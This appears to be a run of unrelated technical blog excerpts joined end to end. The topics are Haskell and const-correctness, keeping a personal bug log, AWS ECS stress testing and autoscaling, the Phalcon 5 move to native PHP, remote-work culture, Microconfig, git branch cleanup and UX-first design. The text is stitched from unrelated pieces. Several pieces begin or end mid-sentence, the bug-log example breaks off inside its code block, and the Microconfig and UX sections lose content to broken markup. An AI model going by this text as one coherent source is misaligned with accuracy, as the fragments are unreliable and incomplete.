<p>Despite my struggles, I continued to read and write Haskell code. I firmly believe that learning new ways to solve the same problem can open your eyes and give you fresh perspectives which generally improve your problem solving abilities. I experienced this when learning Rust, and even though I am starting from scratch when it comes to functional programming and Haskell I have already noticed how it influences the way I write C++ code.</p>
<ul>
  <li>After spending just a brief amount of time coding in Haskell, I now know what it feels like to truly have no global state. Now, C++ obviously doesn’t enforce these rules like Haskell does, but having that experience has encouraged me to incorporate it into the way I write C++. Instead of a class method using a member variable to manipulate state, I may try to create a struct for inputs and a struct for outputs so each function call is acting on a separate piece of data. This allows me to run the code in parallel much more confidently. This is a huge plus for me since I deal with a lot of multithreaded code!</li>
  <li>I also have a new-found appreciation for const-correctness due to having truly immutable data in Haskell. It’s very helpful to think about whether or not you expect data to be modified in each C++ function and mark it as <code>const</code> accordingly. It’s not always obvious when variables are modified, so it’s much better to put that burden on the compiler.</li>
</ul>

<p>Granted, these may be habits I’d learn to gravitate towards anyway as I write more C++ code, but using a language that places such a strong emphasis on core tenants such as immutable data was a strong motivator to start incorporating them myself.</p>

<h3 id="whats-the-catch">What’s the catch?</h3>

<p>After being introduced to functional programming, it seemed to be some sort of silver bullet that should be used for everything. I started asking myself a question that you’re probably wondering right now:</p>

<blockquote>
  <p>If functional programming is so great, why doesn’t everyone use it?</p>
</blockquote>

<p>As with anything, there are trade offs. For instance, in the example above when I mentioned creating input/output structs instead of using class member variables to pass between functions, I’m trading conciseness and a stronger thread-safety guarantee for space. If my function inputs or outputs are very large, it may be too costly to create fresh copies of the data structure on each invocation of the function based on the time and space constraints.</p>

<p>The main issue is that it’s impossible to do anything of value without having <em>some</em> side effects. Printing to the console, reading/writing to a socket, and creating a file are all forms of side effects. It seems to me that there is a sweet spot between a fully pure language and a language that can handle side effects, and therefore produce business value. Perhaps that sweet spot has not yet been found by many companies, which could explain why functional programming has not yet gained a foothold in the corporate world.</p>

<h3 id="conclusion">Conclusion</h3>

<p>Despite the drawbacks outlined above, I’m optimistic about functional programming, and I think it’s only going to become more relevant. I’m excited to “start from scratch” with something brand new. Reading Greg Michaelson’s <a href="https://www.amazon.com/Introduction-Functional-Programming-Calculus-Mathematics/dp/0486478831">Introduction to Functional Programming through Lambda Calculus</a> and Bartosz Milewski’s <a href="https://bartoszmilewski.com/2014/10/28/category-theory-for-programmers-the-preface/">Category Theory For Programmers</a> are providing plenty of difficult, new topics to think about while I program. It’s going to take a while to feel comfortable but I hope to write about more specific topics in the future and how they make me a better programmer. Thanks for reading!</p>

You might develop some techniques to prevent some from happening but others will show up, it never ends.</p><p>In order to learn from those mistakes and try to avoid them in the future you can develop a bug log. We’ll see here what that is and how it works but I promise it helps.</p><p>I recently introduced this idea at <a href="https://buffer.com/">Buffer</a> where I’ve been working for almost 5 years now and I thought it’d be cool to share it publicly here as well.</p><h2 id="the-endless-cycle-of-software-development">The (endless) cycle of software development</h2><pre><code>1. Work on a new feature
2. Fix bug(s)
3. Go back to 1.
</code></pre><p>Sometimes you might focus on only developing new features or only fixing bugs but those are the biggest chunks of your work if you’re building software.</p><p>I think we focus a lot on the how to develop more effectively new features: using the latest framework, text editor or IDE, a new programming paradigm, etc. and when we build something new again, we try to apply the things we’ve learnt and improve.</p><p>On the other hand, when we fix a bug, we tend to do it as quick as possible and then move on to something else, almost like it didn’t happen in the first place. Very few people spend any time trying to learn new debugging techniques instead of learning the latest framework that came out.</p><p>If we spent more time reflecting on those errors, learning from them and understanding where they came from we could improve a lot.</p><h2 id="documenting-a-personal-mistake">Documenting a personal mistake</h2><p>I’ve started to document those bugs, only the ones where I was the only engineer who did it so I can totally understand the context and reflect on what I personally did.</p><p>There are many different ways to do this, but I thought it’d be cool to have one place where I can gather all of them and search in the future for references and patterns. I don’t know if the term already exist but I called it the “bug log”. 🤷‍♂️ 😅</p><h2 id="what-s-a-bug-log">What’s a bug log?</h2><p>A bug log is a collection of your past introduced bugs with different sections for each bug:</p><ul><li>The context where the bug was introduced and what you were trying to achieve (fixing another bug, adding a new feature, etc).</li><li>Why the bug happened. What was wrong in production that made you realize that there was a bug.</li><li>How you fixed it.</li><li>The lesson you learned afterwards. A summary of what you’ve learned in the process.</li></ul><p>These sections are the ones that work for me, but feel free to adapt them to your needs if you want to start a bug log.</p><h2 id="an-example-of-an-entry-in-the-bug-log">An example of an entry in the bug log</h2><div><pre><code data-lang="md"><span># Context

For example, a parser that compares the env. variables used in a new pull request with the ones that are in production.</p><h2 id="where-do-i-store-the-bug-log">Where do I store the bug log?</h2><p>I’ve become a big fan of <a href="https://notion.so/">Notion</a> and I’ve added it there so other team members can see it but it could be anywhere, any note-taking app or even a Github repo with some markdown files could work.</p><h2 id="what-to-do-with-the-lesson-learned-sections">What to do with the “lesson learned” sections?</h2><p>Something I’ve realized is that by summarizing in one sentence the bug I introduced and why I can easily reflect and learn the lesson. I’ve taken one extra step to not forget it for the future so I use <a href="https://apps.ankiweb.net/" target="_blank">Anki</a>, a solution for reviewing cards from time to time, helping you learn what’s in the card.</p><p>I used it before for other purposes but I created a new collection for this. What I do is creating a card whose front is the situation I faced when I introduced the bug and the back is the lesson learned. For example, here it’d be:</p><pre><code>Front
--------
What should I do when I use an environment variable in the code?

Back
--------
Check by doing X/Y if it's set in the right environments.
</code></pre><p>Here’s how it looks in Anki:</p><p><img src="https://josemdev.com/images/anki-bug-log.png" alt="Anki Bug Log" title="Anki Bug Log"></p><p>This will reinforce my learning and it’s easier that I remember it in the future. It can also include some code samples so you associated the situation to new code that you’ll be modifying in the future.</p><p>I’m a big fan of <a href="https://apps.ankiweb.net/" target="_blank">Anki</a> and how it can help you improve as an engineer so I’ll write an article about it soon.</p><p>The other thing I do is before filling a new entry, I can try to search in the log something similar. Sometimes that helps me understand if I tend to make the same kind of mistakes.</p><p><br>I hope this was useful to you! Do you have any thoughts or feedback?

With these servers comes operational complexity, and an operational burden to deploy, monitor, operate and upgrade.</p><p><img alt="Three tier application" src="https://techblog.assignar.com/assets/images/3-tier-96e15b6d03c6c22c1e4f70def467e7ba.png"></p><p>Running applications on Amazon ECS Fargate with the Amazon ALB is a great way to <a href="https://docs.aws.amazon.com/whitepapers/latest/microservices-on-aws/serverless-microservices.html" target="_blank" rel="noopener noreferrer">reduce operational complexity</a> by removing the need to manage any servers. At Assignar, where possible we operate on serverless technologies like AWS Lambda and AWS Fargate which allows us to focus on the product and reduce our operational costs. In most cases, our services look very similar to typical three-tier applications, only serverless. These smaller three-tier services (micro-services) interact to form a distributed system.</p><p>An important step for managing this distributed system, or any distributed system, serverless or not, is to understand when services become <a href="https://landing.google.com/sre/sre-book/chapters/monitoring-distributed-systems/" target="_blank" rel="noopener noreferrer">saturated</a>. One way to understand a service's saturation point is to perform a stress test to measure the capacity and reliability of the system under critical load. The AWS Well-Architected framework outlines a key <a href="https://docs.aws.amazon.com/wellarchitected/latest/reliability-pillar/design-principles.html" target="_blank" rel="noopener noreferrer">design principle</a> to consider when operating reliable systems; <em><strong>Stop guessing capacity</strong></em>. AWS recently released a tool to help with this; <a href="https://aws.amazon.com/solutions/implementations/distributed-load-testing-on-aws/" target="_blank" rel="noopener noreferrer">Distributed Load Testing</a>.</p><h2>Stress Testing</h2><p>We took a two step approach to mesure the saturation point of our service. Step 1, find the breaking point of a single node. Step 2, scale horizontally and find the the breaking point of the entire system. </p><h3>Step 1 - Breaking a Single Node</h3><p>The first and probably most important consideration when performing a stress test or load test is to select some <a href="https://www.webperformance.com/load-testing-tools/blog/2010/09/choosing-the-scenarios-for-a-load-test/" target="_blank" rel="noopener noreferrer">meaningful</a> and <a href="https://loadninja.com/load-testing/" target="_blank" rel="noopener noreferrer">realistic</a> test scenarios. Our test scenario below performs a stress test against one of our expensive GraphQL API operations, which is used to fetch alerts for customers.</p><p>In the <em>Distributed Load Testing</em> web console, we set the target endpoint to our GraphQL HTTP endpoint, the HTTP method to <code>POST</code> and the body of the request to our GraphQL query. We configured the test to ramp from 0 to 100 concurrent requests over 5 minutes. The hold time was configured to hold at 100 concurrent requests for 2 minutes. The node we are testing against is configured with 1 vCPU and 2GB of Memory.</p><p><img alt="Test configuration" src="https://techblog.assignar.com/assets/images/configuration-2efbb9e5327f43f41339c87d5983502b.png"></p><p>With the above configuration, we observed the results below.</p><p><img alt="Load testing results for a single node" src="https://techblog.assignar.com/assets/images/results-21cd9828dd156b1654db76547e7f422f.png"></p><p>Out of 18,886 requests, 5936 (31.5%) were sucessful and 12930 (68.5%) failed. Oberserving the HTTP error codes, 1851 (9.8%) requests were HTTP 502 Bad Gateway server errors. 11079 (58.7%) requests were HTTP 503 Service unavailable server errors. We were able to sustain for around 3 minutes and then performance suddenly dropped off.</p><h4>What happened?</h4><p>At the three minute mark, our Application Load Balancer (ALB) marked our single node as unhealthy as HTTP health checks failed. We can see this in the ECS events:</p><div><div><div tabindex="0"><div><p><span>service alerts (port 80) is unhealthy in target-group alerts-target-group due to (reason Request timed out).</span></p><p><span>service alerts deregistered 1 targets in target-group alerts-target-group</span></p></div></div></div></div><p>Essentially we performed <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank" rel="noopener noreferrer">DDOS attack</a> on our own service. The node's workers were all occupied serving requests and there was no workers available to serve the HTTP health checks. There is further evidence of this in the HTTP 502 errors which indicate requests were not able to communicate with our application backend. When the node was marked as unhealthy it was removed from service. From this point on, we observe HTTP 503 errors from the ALB because there are no nodes available to service requests. </p><p>This is a good indication of the when a single node will become <em>saturated</em>. The <em>saturation</em> point for this API was a continous stream of 60 concurrent requests. This is a fairly low number compared to the <a href="https://wrongsideofmemphis.com/2013/10/21/requests-per-second-a-reference/" target="_blank" rel="noopener noreferrer">load other services can handle</a> which can be attributed to the fact this is one of our most expensive APIs, a <em>worst case</em>. We were limited by the number of workers available on the node. To mitigate this, we could increase the number of workers available to our application server, increasing the capacity and throughput for a single node. We could also consider <a href="https://aws.amazon.com/builders-library/using-load-shedding-to-avoid-overload/" target="_blank" rel="noopener noreferrer">load-shedding</a> to prevent an overload of the node and migitate <em>back pressure</em> of upstream services (a database cluster, for instace).</p><p>However in this case, to maintain availability, we know the <a href="https://docs.aws.amazon.com/wellarchitected/latest/reliability-pillar/design-principles.html" target="_blank" rel="noopener noreferrer">best practice from AWS</a> is to <em><strong>Scale horizontally to increase aggregate workload availability</strong></em>.</p><h3>Step 2 - Scaling Horizontally</h3><p>Before we can perform a stress test on our system with <a href="https://docs.microsoft.com/en-us/azure/architecture/best-practices/auto-scaling" target="_blank" rel="noopener noreferrer">horizontal scaling</a> we need to determine our <em>scaling policy</em>.</p><p>The <a href="https://web.archive.org/web/20161227201811/http://techblog.netflix.com/2012/01/auto-scaling-in-amazon-cloud.html" target="_blank" rel="noopener noreferrer">traditional wisdom for autoscaling</a> is to first determine what resource your workload is bound by, and scale on that. CPU-bound applications should scale on CPU, IO-bound should scale on connections and Memory-bound applications should scale on memory, and so forth. It's not uncommon that your workload might have be constrained by two different resources, and in this case it makes sense to scale on both these resources. This is possible in ECS by using <a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/using-metric-math.html" target="_blank" rel="noopener noreferrer">Metric Math</a> to combine data from multiple CloudWatch metrics. An example of using this with ECS can be found <a href="https://marbot.io/blog/cloudwatch-combined-metrics.html" target="_blank" rel="noopener noreferrer">here</a>. A second, newer alternative in AWS is <a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/Create_Composite_Alarm.html" target="_blank" rel="noopener noreferrer">CloudWatch composite alarms</a> to combine multiple alarms. The former combines metrics, the latter combines alarms.</p><p>At Assignar, we scale by using Metric Math but include step scaling so that we can <a href="https://docs.microsoft.com/en-us/azure/architecture/guide/design-principles/scale-out" target="_blank" rel="noopener noreferrer">scale aggressively</a> if we encounter unexpected spikes. For our ECS service, we've opted to scale on CPU, Memory utilisation and <code>RequestCountPerTarget</code>.</p><p>I can offer one piece of advice when using multiple metrics to scale; <strong>only have one decision point for scaling</strong>. In other words, do not try and attach multiple scaling polocies to your service. Combine your scaling into a single decision. This eliminates the possibility of <a href="https://en.wikipedia.org/wiki/Thrashing_(computer_science)" target="_blank" rel="noopener noreferrer">thrashing</a>, for example when <em>scale out</em> on CPU brings your average memory utilisation below your <em>scale in</em> threshold, and vice versa.</p><p>With our scaling policy set, we repeated the same stress test as the single node test, 0 to 100 requests ramping up over 5 minutes, which yielded the results below.</p><p><img alt="Load testing results for a multiple nodes" src="https://techblog.assignar.com/assets/images/results-6cb902fbef60838c721231c0076adef1.png"></p><p>We see very similiar behaviour to the single node test, where the response time increases as the load increase, but this time we were able to scale horizontally to handle the increasing load. As a result, in this test, 100% of requests were succesful. We see the following message in the ECS service events, where we scale from 1 to 4 tasks:</p><div><div><div tabindex="0"><div><p><span>Message: Successfully set desired count to 4. Change successfully fulfilled by ecs. Cause: monitor alarm alerts-HighUsageAlarm in state ALARM triggered policy alerts-up</span></p></div></div></div></div><h4>A bug in our scaling policy</h4><p>The first time we performed this stress test, it was surprising to find that scaling did not work as expected. We had a bug into our scaling policy by supplying the incorrect dimensions to our CloudWatch metrics. The metric expects the ALB and Target dimensions to be in the <em>full name</em> format whereas we were supplying these <em>ARN</em> format.</p><p>Incorrect ❌:</p><div><div><div tabindex="0"><div><p><span>            Metric:</span></p><p><span>              Namespace: AWS/ApplicationELB</span></p><p><span>              MetricName: RequestCountPerTarget</span></p><p><span>              Dimensions:</span></p><p><span>                - Name: LoadBalancer</span></p><p><span>                  Value: !Ref ALB</span></p><p><span>                - Name: TargetGroup</span></p><p><span>                  Value: !Ref TargetGroup</span></p></div></div></div></div><p>Correct ✅:</p><div><div><div tabindex="0"><div><p><span>            Metric:</span></p><p><span>              Namespace: AWS/ApplicationELB</span></p><p><span>              MetricName: RequestCountPerTarget</span></p><p><span>              Dimensions:</span></p><p><span>                - Name: LoadBalancer</span></p><p><span>                  Value: !GetAtt ALB.LoadBalancerFullName</span></p><p><span>                - Name: TargetGroup</span></p><p><span>                  Value: !GetAtt TargetGroup.TargetGroupFullName</span></p></div></div></div></div><p>We expected to scale out when the <code>RequestCountPerTarget</code> breached our configured threshold. This was not the case. If not for the stress test, this error likely would not have been caught untill after this feature was released to production, so at minimum stress testing can be useful as a sanity check that the infrastructure is working.</p><h4>Stress testing with horizontal scaling</h4><p>Having a work scaling policy, we now need to do a full stress test of the system system with horizontal scaling enabled. </p><p>For this test, we modifed the ramp up to range from 0 to 800 concurrent requests. An 8x increase of load. The ramp up was also increased from 5 minutes to 20 minutes with a 4 minute hold time. </p><p><img alt="Load testing results for a multiple nodes" src="https://techblog.assignar.com/assets/images/final-results-62fd2458e3891a4029f5ac6b5faed77b.png"></p><p>😱😱😱😱😱😱.</p><p>Under the additional load, only 73% of requests were sucessful, with 27% of requests returning error responses. In addition to 502s and 504s, we now also have 504s and 500s errors being thrown by the application.</p><h4>What happened?</h4><p>We are removing unhealthy nodes faster than we <em>scale out</em> which means there is a war between launching new nodes and removing existing nodes failing health checks. This is causing our application response times to fluctuate in sawtooth pattern, <em>thrashing</em> between error and sucess states. This is reflected in our ECS service statistics we the running count of nodes fluctuates in the same sawtooth pattern.</p><p><img alt="Node Availability" src="https://techblog.assignar.com/assets/images/node-availability-7a9de25876b07886af4e377d028109c6.png"></p><p>In the ECS events, we saw the same error we saw in the single node test, nodes are failing health checks.</p><div><div><div tabindex="0"><div><p><span>service alerts (port 80) is unhealthy in target-group alerts-target-group due to (reason Request timed out).</span></p><p><span>service alerts deregistered 1 targets in target-group alerts-target-group</span></p></div></div></div></div><p>Our scaling policy is configured to calculate how many nodes to launch each scaling cycle, with a maximum of 3. During the stress test, the scaling policy was recommending we launch 9 nodes, however due to the cap of 3, we are only scaling a third of recommended amount the each scaling cycle. The cap was implemented to help smooth out the scaling curve and prevent overscaling, but in this case it has the opposite …</p></section></div>

                        <p>Unfortunately we were unable to finish the hangout last Friday, due to technical issues. So as promised, here is a summary of the hangout discussion including points we missed.
<!--more--></p>

<h3 id="summer-progress">Summer Progress</h3>
<p>Similar to last year, summer is always slow moving and with the added Covid, the team had to focus on work/family even more.</p>

<p>Nikos had 2 weeks of vacation, the first vacation he had in the last 5 years. well deserved, and really nice to spend time with the family. Ruud and Serghei also had vacations and Anton is getting ready for some time off.</p>

<h3 id="team-changes">Team changes</h3>
<p>Serghei is stepping down and cannot commit time to the project. He needs to concentrate on work and family of course. He was very nice to tell us that he will no longer be able to help - not fooling anyone or offering promises that he might not be able to keep.</p>

<p>A huge thank you to Serghei. He has learned C/Zephir on his own, trying to help the project as much as possible. He maintained both Phalcon and Zephir during the v3 latter versions, up until the end of 2018, when Nikos stepped up to help with Phalcon.</p>

<p>The team remains dedicated for the project as time permits.</p>

<h3 id="zephir">Zephir</h3>
<p>Now that Serghei has stepped down, we have an issue with Zephir. We no longer have any active maintainers for the project to assume the lead and help with development/bugs etc.</p>

<p><a href="https://zephir-lang.com/">Zephir</a> was invented to help with contributions for Phalcon - a much simpler language, similar to JS/PHP, that anyone can learn easily and contribute. Unfortunately, the language did not gain popularity, and therefore not many people wanted to contribute. The language became stagnant and difficult to maintain. A lot of bugs were discovered and ended up being very difficult to fix unless the whole language was redesigned.</p>

<p>With no other options available, we will put active development of Zephir on hold, and we do not expect it to be compatible with PHP 8. Maintainers are always welcome to step up and help with Zephir.</p>

<h3 id="phalcon">Phalcon</h3>

<p>Without Zephir we are not going to be able to properly maintain and enhance Phalcon. This leaves us with two options:</p>
<ul>
  <li>abandon Phalcon or</li>
  <li>take the brave step to move forward by switching to native PHP.</li>
</ul>

<p>The team decided to switch to native PHP for Phalcon 5. We will try to support Phalcon 4 as much as possible and try to release Phalcon 4.1. We will use our funds to fix some critical Zephir issues that are blocking Phalcon.</p>

<h3 id="phalcon-5">Phalcon 5</h3>
<ul>
  <li>Pure PHP implementation</li>
  <li>Installable as <code>composer</code> package</li>
  <li>Backwards compatible as much as possible (it will depend on how easy we can translate the current C parsers for Volt, PHQL and Annotations)</li>
  <li>Support PHP 7.4 + PHP 8 (Currently in Beta)</li>
  <li>Phalcon goals and philosophy remain unchanged (performance, low overhead, ease of use)</li>
  <li><a href="https://github.com/niden/cardoe">Cardoe</a> (side project by <a href="https://github.com/niden">niden</a> can be used as starting point</li>
  <li><a href="https://github.com/pmjones/adr">ADR</a> (Action Domain Responder) pattern as scheduled around v4</li>
  <li>Will aim for 100% code coverage and tests</li>
  <li>Opens up the possibility for async (future)</li>
</ul>

<h3 id="timeline">Timeline</h3>
<p><strong>August</strong></p>
<ul>
  <li>v4 bugs</li>
  <li>v5 requirements</li>
  <li>v5 design</li>
  <li>what we will reuse and what not</li>
</ul>

<p><strong>September</strong></p>
<ul>
  <li>v5 design presentation</li>
  <li>repo setup</li>
  <li>ci</li>
  <li>performance tests</li>
  <li>backlog grooming</li>
</ul>

<p><strong>November</strong></p>
<ul>
  <li>v5 alpha</li>
</ul>

<p><strong>December</strong></p>
<ul>
  <li>Devtools</li>
  <li>Sample apps</li>
</ul>

<h3 id="conclusion">Conclusion</h3>
<p>This is not a decision we wanted to make but we have to be realists. We cannot abandon the community and we do believe that Phalcon is a great project that adds value to the PHP community.</p>

<p>Although we will lose some of the performance that we had been accustomed to by using Phalcon, PHP 7 and (hopefully) PHP 8 managed to bridge the performance gap that we saw when using PHP 5.x and Phalcon.</p>

<p>Our main focus will always be to keep the framework as fast as possible. By switching to PHP, the community can now be more actively involved with the project and also help with addons, incubator and much more.</p>

<p>Thank you to all and looking forward to the new challenges that v5 will present us with.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Nowadays, more and more people prefer to work from home, so it’s quite common for businesses to have a remote-first team. Developing a healthy company culture when most of your team is remote can be difficult, but we are here to help. Here you have a list with some of the top tips and tricks you can use to establish a stellar remote-first company culture!</p><h2>Perform team building activities on Zoom</h2><p>The truth is that it can be difficult to connect with each other when most of the team works remotely. That’s why the best approach here is to have all kinds of team building activities via Zoom. Something as simple as discussing movies, sharing ideas and even playing some games while social distancing can help a lot. You want to help your team relax and unwind, so any remote team building activities will help a lot.</p><h2>Encourage everyone to communicate and share feedback</h2><p>A great remote-first company culture focuses on communication. Even if the entire team is remote, it’s extremely important to connect with one another, ask for feedback and see what can be improved. Allowing everyone to speak their mind and listening to what they have to say is very productive. It also encourages every employee to deliver their best, which leads to more productivity and higher profits.</p><h2>Offer the best remote infrastructure</h2><p>Make sure that your team has all they need in order to work efficiently. Using tools like Slack for example boost team management and it also makes tracking tasks a lot easier. You can also rely on cloud solutions for storing and sharing documents. Google Drive or Dropbox will do just fine here. The idea is to constantly bring in the best remote work solutions and implement them wisely. Your team will be happy and a lot more productive.</p><h2>Automation is key</h2><p>Finding ways to automate tasks for your remote team can be very important. You do want to make sure that you focus on ways that increase the workflow efficiency. Automating even the simplest tasks will open up more time for your team to work on those things that really matter.</p><h2>Stay away from employee monitoring tools</h2><p>A lot of business owners believe that employees waste time when they work remotely. The truth is that employees are more efficient when they work from home. Which is why the best company culture is focused on transparency and trust. You shouldn’t use employee monitoring tools, as they are invasive and show a lack of trust right from the start.</p><h2>Conclusion</h2><p>Using these tips and tricks will make it easier than ever to develop a healthy remote work mentality. You always want to make sure that you commit to the idea of having a remote team and assist them the best way that you can. Everything from delivering the right remote work infrastructure to having great ideas for virtual events will help a lot.

                    <p>This guide describes how Microconfig can help you solve common microservice configuration
                        problems.
                    </p>
                    <p>More details you can find in <a href="https://microconfig.io/documentation.html">Docs</a>. </p>

                        <h2>Simple Configuration Layout</h2>

                        <div>
                            <div>
                                <div>
                                    <h4>Problem</h4>

                                    <p>Other configuration frameworks can demand a specific configuration folder
                                        structure or specific filenames.
                                    </p>
                                </div>

                                    <h4>Solution</h4>

                                    <p>Microconfig only asks you to create folders for your services somewhere in
                                        <code>components</code> folder. You choose the names and folder structure. If
                                        you have different types of configuration just place them in the same service
                                        folder.
                                    </p>
                                </div>
                            </div>
                        </div>

                        <pre><code>
                        components

                        <h2>Reuse Common Parts</h2>

                        <div>
                            <div>
                                <div>
                                    <h4>Problem</h4>
                                    <p>Microservices have a lot of shared configuration parts that is copy-pasted
                                        between them. So you need to go through all services one by one to update this
                                        shared part.
                                    </p>
                                </div>

                                <div>
                                    <h4>Solution</h4>

                                    <p>Microconfig allows you to extract common parts of configuration to a dedicated
                                        component and reuse it with <code>#include</code>. This way service config is
                                        more focused on unique parts and all common parts are just included. In this
                                        case if
                                        you need to update your common part you just do it in one place and everyone
                                        gets
                                        this update via <code>#include</code>.
                                    </p>
                                </div>

                                    <p>Different services can depend on each other's configuration keys. For example
                                        frontend needs backend's api base path. You can just keep this value in two
                                        places but in this case you need to remember about this dependency and update
                                        them
                                        both.
                                    </p>

                                    <h4>Solution</h4>
                                    <p>Microconfig can reference a value from current or another component with a
                                        <code>${placeholder}</code>. This allows you to keep values only in original
                                        services and all who depend on them can just have an explicit reference. In this
                                        case you need to update the value only once.
                                    </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><a href="https://www.ego-cms.com/tags/tools"><p>Tools</p></a><p>This is a short Github guide our new developers often use to get a hand on Github and its commit hooks in our projects. (You are also welcome to
take a look at it if you’re interested.)</p></div></div><article><div target="_blank"><p>Today, I want to show how you can automate removing of old branches when merging child branches in a parent branch. Now, one can say this topic had already been overtaken due to the wide use of CI and services like github/bitbucket. But as the story says: “Github will help only those who help themselves.”</p><p>Let’s assume we have a project of the following structure:</p><figure><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5cf6797c2002df1becea68be_Project-structure.png" alt=""></p></figure><p>To start removing branches, we need to define first what actually needs to be removed.<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/0f3b520ca7b84f556b50c4bcde0149da.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>Returns all branches names that contain current commit. If HEAD is on e, we will get the following output:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/02c06d38b9993082b991d515c1dad854.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>To exclude the current branch, as well as a master one, from the output, let’s add the following regex:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/30d065dc3c5ae11eb456ff063df945cf.js&lt;/p&gt;<br>‍</em></p><p><em>‍</em>If you need to exclude any more branches, ‘develop’ for example, the expression will look like:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/906da61330d1353aa296f61a4a5adeab.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>To remove detected branches from the remote repository, we run the command:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/8403671fe876563c3edc4d4726333ab8.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>And here’s how it will look like after being combined with the logic we already have:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/1af166f0ae8f865d1aeae3a0725bd799.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>Now after we’ve written a code that removes a branch from a remote repository, we need to make sure that local branch copies always end up being removed too. The following instruction will help us so this:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/7c7ef77be856d1113acc4fdcdabbe914.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>After removing all branches from a ‘remote’, this is how instruction’s output will look like:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/238138cf132fec641ef1c16c75d1572b.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>As seen from the output, branches now have ‘gone’ status, which allows us to write a regex, find branches, and delete them.<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/7428abde45bc5e6617dcf7be0dc6a4fa.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>From combining it with the previous expression, we’ll get:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/8d467f419e9a17e933e3b688115f2f75.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>After command execution, we’ll get the following output:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/3ec1be515fc7fe83de2101fff64da198.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>For the sake of convenience, let’s add ‘alias’ for this command into gitconfig, by calling<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/1fa9ea5fd8801f573f2ad2ec497286f8.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>And adding the following string there:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/d89da263294f3b2ad749fee965887eff.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>Now we can remove branches with a single command<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/a6508abab7e7e1e51683e9edf05bbf4d.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>There’s only one small problem left: no to forget to run a script that removes unnecessary branches whenever merging is done.

		<p>Imagine you are building your dream house. Would you trust a general contractor who talks like this?</p>
<blockquote><p>First, we’re going to pick out the material for the kitchen counter and the glass for the windows. Let’s just guess the amounts of each to buy for now.</p>
<p>Then we’ve got to buy some of that new concrete everyone’s been talking about. I suppose a truckload will do it for now, but we could always order more later. I just can’t wait to try it out!</p>
<p>After putting the beams in place we should decide how many floors the house should have. And right at the end we should decide what style the house will be. Sometime before you move in we should get planning permission, and I’ll probably contact an architect for some drawings after you’ve settled in.</p></blockquote>
<p>It sounds ludicrous because there’s a well-established method for building houses, and it’s based on common sense. You start with a vision, get a set of plans, pour a foundation, build the framework, fill in the internal stuff, and finally finish all the little details.</p>
<p>Putting any step out of order would cause complete chaos. Finishing the walls before the electrical would mean you’d have to punch holes in all your walls in order to run wires around the house. Cleaning it before it is completely finished would be a wasted effort given the amount of dust builders cause while they work.</p>
<p>However many coders <strong>build their systems backwards</strong>. They become enamored with the latest whizz-bang framework or charmed by the reportedly speedy performance of the newest database. And they lead their thinking with those choices as they build new features, whether those technologies are appropriate or not.</p>
<p>More importantly, using a technology-first design typically means that the user experience (UX) will be left until last. And if you put your users last in your order of priorities, it will unfortunately be very evident in your system’s lack of usability.</p>
<h3>UX First</h3>
<p>The first order of business in application design is deciding what its users will experience. This should be a high-level vision sketched out on paper or in simple digital mockups, and it should express the flow of the system from the user’s perspective.</p>
<p>It doesn’t matter if you’re building a web application for senior citizens or a system-level tool for serious computing nerds. <strong>The UX must be designed first.</strong></p>
<table>

<p><b>Your First Thought Should NOT Be…</b></p>

<tr>

<td>“Let’s design the UX”</td>
</tr>
</tbody>
</table>
<h3>Then Comes The Architecture</h3>
<p>Once the UX has been designed and the vision of the system has been defined, an architecture should be laid out to make sure that the code that eventually gets written will actually meet the needs of the users. The choices made in the UX design radically shape and inform a system’s architecture.</p>
<p>A good UX design will cater for less obvious things that might be part of the overall user experience. A well-written specification might include requirements such as “the overall load time for page loads must be less than 200 msec” because the designers know the consequences of <a href="http://blog.kissmetrics.com/loading-time/">slow page load speeds</a>. It might also call for close-to-zero downtime, so the architecture might end up requiring a <a href="http://www.informationweek.com/cloud-computing/infrastructure/amazon-outage-multiple-zones-a-smart-str/240009598">multi-datacenter deployment</a>.</p>
<h3>Last But Not Least, The Tools</h3>
<p>Now it’s finally playtime! Once the UX has been defined and the architecture has been laid out, the process of picking the right technologies, frameworks and libraries can begin. The crucial point is that now the tools are being chosen with the UX and architecture in mind, so any tool that doesn’t fulfill the needs of either can be quickly disregarded.</p>
<h3>This Does Not Mean “Waterfall”</h3>
